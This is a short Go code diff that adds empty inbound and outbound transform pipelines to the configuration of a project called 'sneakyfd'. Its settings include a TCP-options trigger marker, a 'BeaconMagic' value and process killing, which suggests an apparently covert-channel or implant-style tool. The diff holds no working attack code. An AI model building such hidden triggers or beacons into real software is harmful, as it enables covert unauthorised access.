@@ -4,6 +4,7 @@ import (
 	"time"
 
 	"sneakyfd/internal/marker"
+	"sneakyfd/internal/pipeline"
 	"sneakyfd/internal/types"
 
 	"github.com/rs/zerolog"
@@ -17,3 +18,5 @@ var Markers marker.Markers = marker.Markers{marker.TCPOptionsMarker{MSS: 1337}}
 var KillProcess bool = true
 var WaitProcessTimeout time.Duration = 3 * time.Minute
 var BeaconMagic []byte = []byte{0xDE, 0xAD, 0xBE, 0xEF}
+var PipelineInbound []pipeline.Transform = []pipeline.Transform{}
+var PipelineOutbound []pipeline.Transform = []pipeline.Transform{}
